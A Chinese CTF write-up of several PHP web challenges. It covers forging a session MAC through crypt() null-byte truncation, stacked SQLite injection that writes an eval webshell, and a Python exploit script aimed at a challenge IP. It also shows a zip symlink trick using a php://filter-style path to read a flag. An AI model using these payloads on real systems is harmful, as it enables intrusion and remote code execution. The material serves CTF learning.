<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>My shitty Blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/png<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/favicon.png<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>My shitty blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$entry</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span></span>By <span class="token delimiter">&lt;?</span><span class="token operator">=</span>  <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup">&lt;input type="hidden" name="delete" value="<span class="token prolog">&lt;?= $entry['id'] ?></span></span>"<span class="token operator">></span>
                <span class="token shell-comment comment"># 加个userID再试一下</span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">endforeach</span> <span class="token delimiter">?></span>

  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>用户输入只有三个，session，$_POST[‘content’]，$_POST[‘delete’]，content在插入的时候被prepare了，无敌防御，delete只有和从数据库里查出来的$entry[‘id’]相等时才能进行查询<br>而$entry[‘id’]是一个<code>INTEGER PRIMARY KEY AUTOINCREMENT</code>，完全不可控</p>
<p>只有session中有一个id值，在insert的时候被prepare安全插入，但在get_user和delete_entry时从数据库中取出，并未做额外处理，存在注入</p>
<p>但id需要一个对应的mac通过验证，才能被插入数据库，而mac的生成，似乎非常的安全</p>
<p>整个校验过程为这段代码</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>并不是很懂密码学的我感觉完全没法打，题目会给我们签合法id和mac，但合法的id只会是一个数字，做不到注入效果，需要进行id的伪造</p>
<p>但secret和salt均未知且不可控，crypt中的salt用来加盐且指定算法，一开始在想，如果crypt或者hash_hmac函数中支持加密数据存在注释之类的功能就好了。。。一番搜索后无果</p>
<p>最后是tkmk@0ops提出了crypt函数可以被00截断。如果hash_hmac的结果是\x00开头，则后续内容会被截断，等于对空字符串（还是说00？）进行加密，这样子就能使得整个加密结果不变</p>
<p>首先通过疯狂发包进行碰撞，只要拿到两个mac相同而id不同的数据，就能证明这两个数据在hash后是以00开头的，就能拿到对应的mac值<br>然后构造我们自己的payload，并同样的进行碰撞，以期其hash后以00开头，即可使用之前获取的00hash进行注入</p>
<p>而PHP使用的是PDO连接的sqlite，PDO默认是支持堆叠注入的，我们就可以使用sqlite的attach database操作导出一个webshell进行rce</p>
<p>理论上来说到这这个题就没什么问题了，然而我似乎有些过于愚蠢<br>这个题的dockerfile整体上和其他题的dockerfile类似，权限设置是这个样子的</p>
<pre class=" language-dockerfile"><code class="language-dockerfile">RUN chown -R root:root /var/www && \
    find /var/www -type d -exec chmod 555 {} \; && \
    find /var/www -type f -exec chmod 444 {} \; && \
    chown -R root:root /tmp /var/tmp /var/lib/php/sessions && \
    chmod -R 000 /tmp /var/tmp /var/lib/php/sessions && \
    mkdir -p /var/www/html/data && \
    chmod 703 /var/www/html/data && \
</code></pre>
<p>&#x2F;var&#x2F;www&#x2F;html是不可写的，&#x2F;var&#x2F;www&#x2F;html&#x2F;data仅可写可执行，不可读，而我们的sqlite数据库是在data下新开的目录，可读可写可执行，但目录名为<code>&#39;./data/&#39;.md5($salt.&#39;|&#39;.$id.&#39;|&#39;.$mac);</code>，salt还是没办法弄到</p>
<p>我一度苦恼如何搞到这个路径，发现sqlite有一个命令<code>.database</code>可以显示当前数据库路径，但这种命令统称dot command，只能在输入的开头使用，且不能夹杂在任何查询语句中。路径泄露无果</p>
<p>最后的最后我才发现，原来目录可写可执行但不可读，但目录下的文件可读的话，是可以直接读取那个文件的。。。目录的读的作用就是能让你列目录而已。。。<br>所以直接写data目录就好了</p>
<p>一开始一直在尝试打get_user那个函数，只要我先提交一个content把我的恶意userID插进数据库，那么我每次get访问的时候应该就会自动触发才对？但是我实际上试了半天没成功？最后是用的delete_entry函数才成功的<br>但查资料显示query和exec应该都是支持堆叠的，区别在于query返回结果，而exec只返回受影响的行数<br>所以为什么呢？</p>
<p>贴一个脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> <span class="token operator">*</span>

url <span class="token operator">=</span> <span class="token string">"http://65.108.176.96:8888/"</span>
pair <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
null <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(pair)</span>
    session <span class="token operator">=</span> res<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>
    sessions <span class="token operator">=</span> session<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"%7C"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            null <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        pair<span class="token punctuation">[</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> quote<span class="token punctuation">(</span><span class="token string">";ATTACH DATABASE '/var/www/html/data/z33.php' AS 'test';create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php eval($_GET[z33]);?>');-- "</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># insert user_id</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"delete"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>并不能理解flag在说什么<br><code>hxp&#123;dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(&#125;</code></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>如果，我能早点把本地环境搭起来的话，可能不会在目录权限上苦恼这么久。。。<br>理论上来说出题人给的dockerfile也没有任何的问题，但我本地进行build的时候会超级报错，dpkg如何如何，网上搜索半天并没有找到什么有用的回答，最后不知道在哪个偏僻的角落里面看到了一句升级docker版本。一看原来我本地的docker还挺老的。。。更新docker到最新版本之后真的就build起来了，呜呜</p>
<h2 id="unzipper"><a href="#unzipper" class="headerlink" title="unzipper"></a>unzipper</h2><p>这个题感觉也很难。。。因为我的智力条件你也知道.jpg</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'session_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'data/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$lock</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span> <span class="token punctuation">.</span> <span class="token string">'.lock'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fopen'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flock</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span> <span class="token operator">|</span> <span class="token constant">LOCK_NB</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'flock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'chdir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ulimit -v 8192 &amp;&amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . '</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(^$|flag)/i'</span><span class="token punctuation">,</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>那个lockfile和dockerfile里面的文件清理有关，不用考虑，功能就是给你开一个sandbox然后你可以往里面解压文件，然后还可以提交一个file参数，只要这个file的realpath中没有flag且不为空（realpath在文件不存在时返回false，可以被<code>^$</code>匹配），就给你读这个文件<br>这回flag是004的且没有readflag了，可以直接读</p>
<p>当然，解压文件直接传个PHP上去不就完了，但是这里有两个问题，一个是你不知道sandbox的路径（当然，sandbox存在session里了，可以读session文件获取到），第二个是无敌的nginx配置</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>只解析index.php，所以传了也完全没用</p>
<p>说起解压zip读文件，最经典的就是曾经hctf?(记不清哪场比赛了)的zip软链接读文件，但这里多了一个限制，对传入的文件名进行了一个realpath操作，这个函数会去除所有的软链接以及相对目录，跳目录等各种操作，直接返回完整的路径。这样子的话，软链接就不能用了</p>
<p>但这个realpath有一个问题，它不能识别各种协议，比如经典的PHP伪协议<br>使用如下操作创建出一个看起来是PHP伪协议的目录和文件，再创建一个对应的软链接文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p php://filter/
<span class="token function">touch</span> php://filter/resource<span class="token operator">=</span>aa
<span class="token function">ln</span> -s /flag.txt aa
</code></pre>
<p>打一个包传上去，然后直接file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;aa即可读到flag</p>
<p><strong>如下两题看了官方wp以及各路神仙非预期后更新</strong></p>
<h2 id="counter"><a href="#counter" class="headerlink" title="counter"></a>counter</h2><p>这个题看了蛮久但完全没懂</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$rmf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -f -- '</span><span class="token punctuation">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'default'</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'./data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-zA-Z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$rmf</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>乍一看又是一个带点东西的文件包含，先看一下限制条件</p>
<pre><code>php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
php_admin_value[post_max_size] = 12K
php_admin_value[memory_limit] = 32M
php_admin_value[max_execution_time] = 10s
php_admin_value[opcache.enable] = 0
</code></pre>
<p>关掉了经典upload progress，nginx的日志全部被重定向到标准输入输出，pearcmd起了个本地docker看了下没装<br>不过和上一题不同，这次的nginx config中允许解析所有的PHP后缀了</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>但fastcgi监听的是Unix socket，而不是端口，去年的hxpctf出了一个file_put_content用FTP协议，目的主机端口可控，写本地fpm导致rce的题，今年这个思考了半天感觉ftp也打不通了，没开远程包含，读取了远程也只能写远程，就算用ftp ssrf也没地方写。</p>
<p>功能就是输入一个page，先把这个page读出来和数字1相加，再写进去，最后include</p>
<h3 id="可能的思路？"><a href="#可能的思路？" class="headerlink" title="可能的思路？"></a>可能的思路？</h3><p>由于字符串和数字相加会被转化为数字，所以理论上来说能写进去的内容均为数字（或者套几层PHP伪协议，能base64或者压缩一下）<br>那么一种可能的思路就是先整点数字进去，然后把数字各种套filter最后能套出来一个shell。。。我觉得成功的可能性很低，都不知道怎么套流有可能套成这个样子，抛弃该思路</p>
<p>然后还有一个可能性，就算page直接是一个不可写的文件，因为最后include的一定是本地的一个文件，只要这个文件可写，就最后一定会是数字类型（或套了伪协议的变体），最后包含进来的也就是这样的数据，没有意义。但如果一个文件不可写，那么之前的写入操作就无法完成，能够直接包含进来。（但问题在于不可写的文件都能被包含来getshell了，那不是爽飞了，文件包含无条件究极通杀？）</p>
<p>感觉有两个地方比较奇怪，删除文件的地方为什么要用system？还定义了一个匿名函数？直接用自带的或者定义一个函数都行啊，还非得匿名？以及明明匿名函数都escapeshellarg了，在reset处又对文件名进行了[a-zA-Z0-9]的限制，怪。但是也想不出来有什么问题</p>
